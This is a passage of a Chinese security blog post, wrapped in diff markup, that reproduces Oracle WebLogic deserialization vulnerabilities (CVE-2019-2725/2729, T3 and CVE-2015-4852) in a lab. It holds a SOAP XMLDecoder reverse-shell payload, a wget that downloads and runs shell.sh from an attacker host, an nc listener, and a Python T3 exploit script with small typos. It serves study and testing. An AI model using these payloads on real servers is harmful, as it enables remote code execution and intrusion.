class="name">wsa:Action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.116.63/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>此处还是用void标签替代了object标签</strong></p>
+<p>页面响应202</p>
+<p><img src="https://pic1.imgdb.cn/item/6809151358cb8da5c8c6be8c.png"></p>
+<p>反弹shell成功</p>
+<h3 id="5-CVE-2019-2729"><a href="#5-CVE-2019-2729" class="headerlink" title="5. CVE-2019-2729"></a>5. CVE-2019-2729</h3><h4 id="5-1-漏洞介绍"><a href="#5-1-漏洞介绍" class="headerlink" title="5.1 漏洞介绍"></a>5.1 漏洞介绍</h4><p>​		CVE-2019-2729漏洞是对CVE-2019-2725漏洞补丁进行绕过，形成新的漏洞利用方式，属于CVE-2019-2725漏洞的变形绕过。与CVE-2019-2725漏洞相似，CVE-2019-2729漏洞是由于应用在处理反序列化输入信息时存在缺陷，攻击者可以通过发送精心构造的恶意HTTP请求，用于获得目标服务器的权限，并在未授权的情况下执行远程命令，最终获取服务器的权限。</p>
+<p>影响版本:10.3.6.0，12.1.3.0，12.2.1.3</p>
+<h4 id="5-2-漏洞复现"><a href="#5-2-漏洞复现" class="headerlink" title="5.2 漏洞复现"></a>5.2 漏洞复现</h4><p>漏洞利用工具：<a target="_blank" rel="noopener" href="https://github.com/ruthlezs/CvE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py">https://github.com/ruthlezs/CvE-2019-2729-Exploit/blob/master/oracle-weblogic-deserialize.py</a></p>
+<p>​		前面CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是必须要是byte类型的。<br>​		而CVE-2019-2725的补丁也是使用黑名单禁用了class标签，但是我们可以使用<array method="forName">代替class标签即可。</array></p>
+<p>方法一：</p>
+<p>​		访问<a target="_blank" rel="noopener" href="http://192.168.219.185:7001/wls-wsat/CoordinatorPortType,%E8%80%8C%E5%90%8E%E4%BD%BF%E7%94%A8brup%E6%8B%A6%E6%88%AA%E8%AF%A5%E8%AF%B7%E6%B1%82%E3%80%82">http://192.168.219.185:7001/wls-wsat/CoordinatorPortType,而后使用brup拦截该请求。</a></p>
+<p>​		将利用工具中的req.txt提取出来，放于请求中，请求头部添加lfcmd字段，填写whoami命令，用于验证。发送后查看到命令回显。</p>
+<p><img src="https://pic1.imgdb.cn/item/68091a6458cb8da5c8c6bffd.png"></p>
+<p>方法二：</p>
+<p>​		直接使用工具</p>
+<p><img src="https://pic1.imgdb.cn/item/68091b8858cb8da5c8c6c04e.png"></p>
+<p><img src="https://pic1.imgdb.cn/item/68091bfe58cb8da5c8c6c061.png"></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c id</span><br><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "ls /"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>方法三：</p>
+<p>在kali上的/tmp下编写一个shell脚本(shell.sh)，用bash进行反弹shell，内容如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.116.63/4444 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>
+
+<p>而后在kali的/tmp下，使用”python -m SimpleHTTPServer”，开启一个HTTP服务，后续让Weblogic服务器获取shell.sh。<br>在kali上使用漏洞利用工具，执行wget命令让Weblogic服务器下载kali中tmp目录下的shell.sh。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "wget http://192.168.116.63:8000/shell.sh -P /tmp"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用”nc -lvp 4444”，监听4444端口。<br>在kali上使用漏洞利用工具，让服务器执行shell.sh，获取反弹shell。若无法获取shell，可以使用“bash shell.sh”。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python oracle-weblogic-deserialize.py -u http://192.168.116.67:7001/ -c "sh shell.sh"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看nc，发现shell连接成功。</p>
+<h2 id="Weblogic-T3反序列化"><a href="#Weblogic-T3反序列化" class="headerlink" title="Weblogic_T3反序列化"></a>Weblogic_T3反序列化</h2><h3 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1 前置知识"></a>1 前置知识</h3><p>​		WebLogic的T3协议是WebLogic Server使用的一种专有通信协议，主要用于服务器之间的远程调用和客户端</p>
+<p>与服务器之间的通信。</p>
+<h4 id="1-1-RMI协议"><a href="#1-1-RMI协议" class="headerlink" title="1.1 RMI协议"></a>1.1 RMI协议</h4><p>​		RMI（RemoteMethod Invocation）即远程方法调用。它能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输</p>
+<p>​		JavaRMI的默认基础通信协议为JRMP，但其也支持开发其他的协议用来优化RMI的传输，或者兼容非VM，如WebLogic的T3和兼容CORBA的IIOP。</p>
+<p>RMI远程方法调用的过程一般有以下几个部分参与：</p>
+<ol>
+<li>客户端对象(RMI Client)</li>
+<li>服务端对象(RMI Server)</li>
+<li>客户端代理对象(stub）：远程对象在客户端上的代理。</li>
+<li>服务端代理对象(skeleton)：读取客户端传递的方法参数，调用服务器方的实际对象方法，并接收方法执行后的返回值。</li>
+<li>RMI注册表(RMIregister)：其中注册了远程对象，并由RMI客户端查找已注册的远程对象。其以URL形式注册远程对象，并向客户端回复对远程对象的引用。</li>
+</ol>
+<p>RMI调用流程如图：</p>
+<p><img src="https://pic1.imgdb.cn/item/681992cc58cb8da5c8deea43.png"></p>
+<ol>
+<li>服务端创建并注册远程对象，用于客户端访问。</li>
+<li>客户端使用JNDI lookup去查找远程服务器上的RMI服务上的远程对象。</li>
+<li>RMI register返回给客户端远程对象的Stub。</li>
+<li>客户端通过Stub对象调用远程主机对象上的方法。</li>
+<li>Stub代理客户端处理远程对象调用请求，并且序列化调用请求后通过IRMP协议传输，发送给服务端。</li>
+<li>服务端接收到请求后，Skeleton调用方法。</li>
+<li>服务端进行执行然后将返回的结果对象传给Skeleton对象。</li>
+<li>Skeleton接收到结果对象，代理服务端将结果进行序列化，而后发送给客户端</li>
+<li>客户端Stub对象接收到序列化的结果对象，并交由客户端反序列化结果对象</li>
+</ol>
+<h4 id="1-2-Weblogic-RMI"><a href="#1-2-Weblogic-RMI" class="headerlink" title="1.2 Weblogic RMI"></a>1.2 Weblogic RMI</h4><p>​		WebLogic RMI 可以说是WebLogic对 Java RMI 的实现，与上述的Java RM调用过程基本一样，在功能和实现方法上有些差异，两者差异如下：</p>
+<ul>
+<li>WebLogic RMI支持集群部署和负载均衡。</li>
+<li>webLogic支持stub和skeleton动态生成，将对象部署到RMI注册中心或JNDI时，webLogic将自动生成必要的代理。</li>
+<li>WebLogicRMI在进行数据传输时，主要使用自己私有的T3协议进行通信（还有基于CORBA的IIOP协议)。</li>
+</ul>
+<h4 id="1-3-T3协议"><a href="#1-3-T3协议" class="headerlink" title="1.3 T3协议"></a>1.3 T3协议</h4><p>​		T3协议是WebLogic私有的协议，相比于JRMP协议多了如下的一些特性:</p>
+<ol>
+<li>服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。</li>
+<li>通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。</li>
+</ol>
+<h4 id="1-4-JNDI"><a href="#1-4-JNDI" class="headerlink" title="1.4 JNDI"></a>1.4 JNDI</h4><p>​		JNDI（JavaNaming and Directory Interface）是SUN公司提供的一种标准的]ava命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI可以兼容和访问现有目录服务如：DNS、XNam、LDAP、CORBA对象服务、文件系统、RMI、DSMLv1&amp;v2、NIS等。<br>如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jdbc://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">rmi://&lt;domain&gt;:&lt;port&gt;</span><br><span class="line">1dap://&lt;domain&gt;:&lt;port&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="1-5-WebLogicT3反序列化漏洞简介"><a href="#1-5-WebLogicT3反序列化漏洞简介" class="headerlink" title="1.5 WebLogicT3反序列化漏洞简介"></a>1.5 WebLogicT3反序列化漏洞简介</h4><p>​		WebLogic T3 反序列化漏洞从利用方式来划分可以分为前后期，前期直接通过T3协议发送恶意反序列化对象，后期为利用T3协议配合JRMP或INDI接口反向发送反序列化数据。</p>
+<p>WebLogicT3反序列化历史漏洞：</p>
+<table>
+<thead>
+<tr>
+<th align="center">CVE号</th>
+<th align="center">受影响的组件</th>
+<th align="center">受影响版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">CVE-2018-3252</td>
+<td align="center">WLS Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td>
+</tr>
+<tr>
+<td align="center">CVE-2018-3245</td>
+<td align="center">WLS Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td>
+</tr>
+<tr>
+<td align="center">CVE-2018-3191</td>
+<td align="center">WLS Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.3</td>
+</tr>
+<tr>
+<td align="center">CVE-2018-2893</td>
+<td align="center">WLS Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</td>
+</tr>
+<tr>
+<td align="center">CVE-2018-2628</td>
+<td align="center">WLS Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</td>
+</tr>
+<tr>
+<td align="center">CVE-2017-3248</td>
+<td align="center">Core Components</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1</td>
+</tr>
+<tr>
+<td align="center">CVE-2016-3510</td>
+<td align="center">Oracle WebLogic Server</td>
+<td align="center">10.3.6.0, 12.1.3.0, 12.2.1.0</td>
+</tr>
+<tr>
+<td align="center">CVE-2016-0638</td>
+<td align="center">Oracle WebLogic Server</td>
+<td align="center">10.3.6, 12.1.2, 12.1.3, 12.2.1</td>
+</tr>
+<tr>
+<td align="center">CVE-2015-4852</td>
+<td align="center">Oracle WebLogic Server</td>
+<td align="center">10.3.6.0, 12.1.2.0, 12.1.3.0, 12.2.1.0</td>
+</tr>
+</tbody></table>
+<p>其中前期利用方式有CVE-2015-4852、CVEs2016-0638、CVE-2016-3510等。<br>而后期利用方式有CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3191、CVE-2018-3245等。</p>
+<h3 id="2-漏洞原理分析"><a href="#2-漏洞原理分析" class="headerlink" title="2 漏洞原理分析"></a>2 漏洞原理分析</h3><h4 id="2-1-T3协议流量分析"><a href="#2-1-T3协议流量分析" class="headerlink" title="2.1 T3协议流量分析"></a>2.1 T3协议流量分析</h4><p>​		利用相关漏洞利用工具与weblogic进行T3协议的通信，并实现weblogic rmi的调用过程，并使用wireshark抓取通信流量。找到响应的tcp数据包，右键-&gt;追踪流-&gt;TCP流。</p>
+<p><img src="https://pic1.imgdb.cn/item/68199bea58cb8da5c8deee1d.png"></p>
+<p>通信过程的TCP流：</p>
+<p><img src="https://pic1.imgdb.cn/item/68199c2358cb8da5c8deee2b.png"></p>
+<p>然后查看客户端发送的序列化数据的对应包，如下图：</p>
+<p><img src="https://pic1.imgdb.cn/item/68199c5a58cb8da5c8deee46.png"></p>
+<p>这个数据包主要由四部分组成：</p>
+<ol>
+<li>数据包长度。</li>
+<li>T3协议头。</li>
+<li>反序列化标志：T3协议中每个反序列化数据包前面都带有 fe 01 00 00，而后再加上Java反序列化标志ac ed 00 05。</li>
+<li>序列化数据。<br>  (注意：Java反序列化数据开头包含两字节的魔术数字，这两个字节始终为十六进制的<strong>0xac 0xed</strong>，接下来是两字节的版本号这里为<strong>0x00 0x05</strong>。在T3协议的数据包中，在这个四个字节前还有四个字节fe 01 00 00）</li>
+</ol>
+<p>​		这里的数据包只是我们使用漏洞利用工具发送的，其中就只有一段序列化数据，有时候并不只发送一段序列化数据，它可能会发送多个序列化数据，彼此之间以反序列化标志隔开，如下图：</p>
+<img src="https://pic1.imgdb.cn/item/68199efc58cb8da5c8deefe5.png" style="zoom: 67%;">
+
+<p>T3数据包主要内容如下：</p>
+<p><img src="https://pic1.imgdb.cn/item/68199f6a58cb8da5c8def015.png"></p>
+<p>​		从上面我们可以知道第二到第七部分内容，开头都是aced0005，说明这些都是AVA序列化的数据。<u>只要把其中一部分替换成我们的序列化数据就可以了</u>，于是我们可以将第二至七部分的AVA序列化数据的任意一个替换为恶意的序列化数据，或者直接将第一部分与恶意的序列化数据进行拼接后发送给服务端即可。</p>
+<h4 id="2-2-CVE-2015-4852漏洞分析"><a href="#2-2-CVE-2015-4852漏洞分析" class="headerlink" title="2.2 CVE-2015-4852漏洞分析"></a>2.2 CVE-2015-4852漏洞分析</h4><p>​		CVE-2015-4852可以说是WebLogicT3反序列化漏洞的开端，接下来我们将从这个漏洞去了解WebLogicT3反序列化漏洞。<br>​		网上有许多针对CVE-2015-4852的exp，在网上找到以下python脚本与ysoserial工具进行漏洞利用。脚本功能如下：</p>
+<ol>
+<li>使用ysoserial工具生成的一个payload，其利用链为CommonsCollections1，执行的命令为在被攻击服务器的tmp下创建一个名为test_t3.txt的文件。</li>
+<li>将上述已生成的payload添加到T3协议的数据包中，即将T3协议数据包第一部分与恶意的序列化数据进行拼接后发送给服务端。</li>
+</ol>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct 	<span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generatePayload</span>(<span class="params">gadget,cmd</span>):</span><br><span class="line">	YSO_PATH = <span class="string">"ysoserial-master.jar"</span></span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>,YSO_PATH, gadget, cmd],stdout=subprocess.PIPE)</span><br><span class="line">	<span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span><br><span class="line">    <span class="comment">#初始化socket，前者指定用于服务器与服务器之间的网络通信，后者指定基于TCP的流式socket通信</span></span><br><span class="line">	sock=socket.socket(socket.AF_INET，socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))			<span class="comment"># 建立socket连接</span></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span> <span class="comment"># socket握手消息</span></span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data=sock.recv(<span class="number">1024</span>)		<span class="comment">#接收第一个socket数据包，HELO</span></span><br><span class="line">    data1=sock.recv(<span class="number">1024</span>)		<span class="comment">#接收第二个socket数据包，：10.3.6.0.false</span></span><br><span class="line">    isweblogic= re.<span class="built_in">compile</span>(<span class="string">"HELO"</span>).findall(data.decode()	<span class="comment"># 匹配字段中有无HELo</span></span><br><span class="line">    version=re.<span class="built_in">compile</span>(<span class="string">":(.*).0.false"</span>).findall(datal.decode()	<span class="comment">#使用正则匹配服务器握手消息中返回的weblogic版本号</span></span><br><span class="line">    <span class="keyword">if</span> isweblogic <span class="keyword">and</span> version:</span><br><span class="line">   		<span class="built_in">print</span>(<span class="string">"webLogic:"</span>+<span class="string">""</span>.join(version))		<span class="comment">#输出weblogic版本号</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">"NotWebLogic"</span>)					<span class="comment">#对端可能不是weblogic</span></span><br><span class="line">    header=binascii.a2b_hex(<span class="string">b"00000000"</span>)		<span class="comment">#先占位4个字节，这四个字节表示数据包长度</span></span><br><span class="line">    <span class="comment"># 以下为t3协议头		</span></span><br><span class="line">                                                t3header=binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>)</span><br><span class="line">    desflag=binascii.a2b_hex(<span class="string">b"fe010000"</span>)		<span class="comment">#反序列化数据标志fe010000，</span></span><br><span class="line">    payload= header + t3header + desflag+ payload <span class="comment">#将各部分拼接，将ysoserial生成payload添加到后面</span></span><br><span class="line">    <span class="comment">#计算payload长度，并将长度字段放于前四个字节</span></span><br><span class="line">    payload = struct.pack(<span class="string">"&gt;I"</span>, <span class="built_in">len</span>(payload)) + payload[<span class="number">4</span>:]</span><br><span class="line">    sock.send(payload)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main_"</span>:</span><br><span class="line">    ip = <span class="string">"192.168.219.206"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget=<span class="string">"CommonsCollections1"</span> 			<span class="comment">#指定使用commonscollectionsl反序列化利用链</span></span><br><span class="line">    cmd=<span class="string">"touch /tmp/test_t3.txt"</span>			<span class="comment">#让被攻击服务器执行的指定命令，创建一个文件</span></span><br><span class="line">    payload = generatePayload(gadget, cmd) 	<span class="comment"># 仲用ysoserial生成payload</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>​		漏洞的触发点在wIserver\server\lib\wIthint3client.jar\weblogic\rjvmNnboundMsgAbbrev.class中,其中的readObject()方法会处理使用T3协议传入的序列化数据。在readObject(方法中又去调用了InboundMsgAbbrev.ServerChannelInputStream的readObjec方法，这里的var1即是Java序列化数据。</p>
+<p><img src="https://pic1.imgdb.cn/item/6819a90958cb8da5c8df65a6.png"></p>
+<p>​		查看ServerChannellnputStream这个类，发现其继承于ObjectinputStream，而且并没有重写readObject（）方法，可以说这里没有对传入的序列化数据做任何处理，直接传入ObjectInputStream的readObject（）方法中进行反序列化操作。</p>
+<p><img src="https://pic1.imgdb.cn/item/6819aa2c58cb8da5c8df69b4.png"></p>
+<p>​		而weblogic这个版本自带Apache Commons Collections3.2.0,于是我们可以利用ysoserial生成CommonsCollections1的payload进行利用，于是我们将T3协议的序列化数据替换成这个生成的payload即可触发反序列化漏洞。</p>
+<p><img src="https://pic1.imgdb.cn/item/6819a9fb58cb8da5c8df69a0.png"></p>
+</object></p>
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">XMH</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/04/23/weblogic-fan-xu-lie-hua-lou-dong/">http://example.com/2025/04/23/weblogic-fan-xu-lie-hua-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">XMH</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">感谢你的赞！</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/zhifubao.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/weixin.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2025/05/26/rce-labs/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="RCE-labs">
+                        
+                        <span class="card-title">RCE-labs</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-05-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/04/16/webshell-liu-liang-fen-xi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="webshell流量分析">
+                        
+                        <span class="card-title">webshell流量分析</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
